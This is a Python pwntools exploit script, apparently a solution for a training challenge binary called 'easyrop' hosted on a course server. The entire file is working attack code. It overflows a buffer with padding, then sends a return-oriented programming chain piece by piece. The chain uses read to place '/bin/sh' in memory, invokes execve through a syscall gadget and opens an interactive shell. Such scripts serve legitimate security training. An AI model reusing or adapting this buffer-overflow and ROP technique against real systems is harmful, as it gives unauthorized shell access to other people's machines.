from pwn import *
import time

if "REMOTE" not in args:

    r = process("easyrop")
    gdb.attach(r, """
        # b *0x0804841c
        # c
        """)

    input("wait")
else:
    r = remote("bin.training.jinblack.it", 2015)

read = 0x400144
globalVariable = 0x600370
popRdiPopRsiPopRdxPopRaxRet = 0x4001c2
syscallNopPopRbpRet = 0x4001b3
empty = 0x0

print('Fill buffer')

for i in range(24):
    time.sleep(.1)
    r.send(p32(empty))

print('Fill RBP')

for i in range(4):
    time.sleep(.1)
    r.send(p32(empty))

print(p64(popRdiPopRsiPopRdxPopRaxRet))
print(p64(popRdiPopRsiPopRdxPopRaxRet)[0:-4])
print(p64(popRdiPopRsiPopRdxPopRaxRet)[-4:])


print('Send rop gadget')
time.sleep(.1)
r.send(p64(popRdiPopRsiPopRdxPopRaxRet)[0:-4])
time.sleep(.1)
r.send(p32(empty))
time.sleep(.1)
r.send(p64(popRdiPopRsiPopRdxPopRaxRet)[-4:])
time.sleep(.1)
r.send(p32(empty))

print('Send rdi')
time.sleep(.1)
r.send(p32(empty))
time.sleep(.1)
r.send(p32(empty))
time.sleep(.1)
r.send(p32(empty))
time.sleep(.1)
r.send(p32(empty))

print('Send rsi')
time.sleep(.1)
r.send(p64(globalVariable)[0:-4])
time.sleep(.1)
r.send(p32(empty))
time.sleep(.1)
r.send(p64(globalVariable)[-4:])
time.sleep(.1)
r.send(p32(empty))

print('Send rdx')
time.sleep(.1)
r.send(p32(empty))
time.sleep(.1)
r.send(p32(empty))
time.sleep(.1)
r.send(p32(0x8))
time.sleep(.1)
r.send(p32(empty))

print('Send rax')
time.sleep(.1)
r.send(p32(empty))
time.sleep(.1)
r.send(p32(empty))
time.sleep(.1)
r.send(p32(empty))
time.sleep(.1)
r.send(p32(empty))

print('Send syscall')
time.sleep(.1)
r.send(p64(syscallNopPopRbpRet)[0:-4])
time.sleep(.1)
r.send(p32(empty))
time.sleep(.1)
r.send(p64(syscallNopPopRbpRet)[-4:])
time.sleep(.1)
r.send(p32(empty))

print('Send null byte for dumb syscall')
time.sleep(.1)
r.send(p32(empty))
time.sleep(.1)
r.send(p32(empty))
time.sleep(.1)
r.send(p32(empty))
time.sleep(.1)
r.send(p32(empty))

print('Send rop gadget')
time.sleep(.1)
r.send(p64(popRdiPopRsiPopRdxPopRaxRet)[0:-4])
time.sleep(.1)
r.send(p32(empty))
time.sleep(.1)
r.send(p64(popRdiPopRsiPopRdxPopRaxRet)[-4:])
time.sleep(.1)
r.send(p32(empty))

print('Send rdi')
time.sleep(.1)
r.send(p64(globalVariable)[0:-4])
time.sleep(.1)
r.send(p32(empty))
time.sleep(.1)
r.send(p64(globalVariable)[-4:])
time.sleep(.1)
r.send(p32(empty))

print('Send rsi')
time.sleep(.1)
r.send(p32(empty))
time.sleep(.1)
r.send(p32(empty))
time.sleep(.1)
r.send(p32(empty))
time.sleep(.1)
r.send(p32(empty))

print('Send rdx')
time.sleep(.1)
r.send(p32(empty))
time.sleep(.1)
r.send(p32(empty))
time.sleep(.1)
r.send(p32(empty))
time.sleep(.1)
r.send(p32(empty))

print('Send rax')
time.sleep(.1)
r.send(p32(0x3b))
time.sleep(.1)
r.send(p32(empty))
time.sleep(.1)
r.send(p32(empty))
time.sleep(.1)
r.send(p32(empty))

print('Send syscall')
time.sleep(.1)
r.send(p64(syscallNopPopRbpRet)[0:-4])
time.sleep(.1)
r.send(p32(empty))
time.sleep(.1)
r.send(p64(syscallNopPopRbpRet)[-4:])
time.sleep(.1)
r.send(p32(empty))

print('Send null byte for dumb syscall')
time.sleep(.1)
r.send(p32(empty))
time.sleep(.1)
r.send(p32(empty))
time.sleep(.1)
r.send(p32(empty))
time.sleep(.1)
r.send(p32(empty))

print('Exit circle')
time.sleep(.1)
r.send(b'\x08')
time.sleep(.1)
r.send(b'\x09')

print('Send /bin/sh')
r.send(b'/bin/sh\x00')
time.sleep(.1)
r.send(p32(empty))

r.interactive()
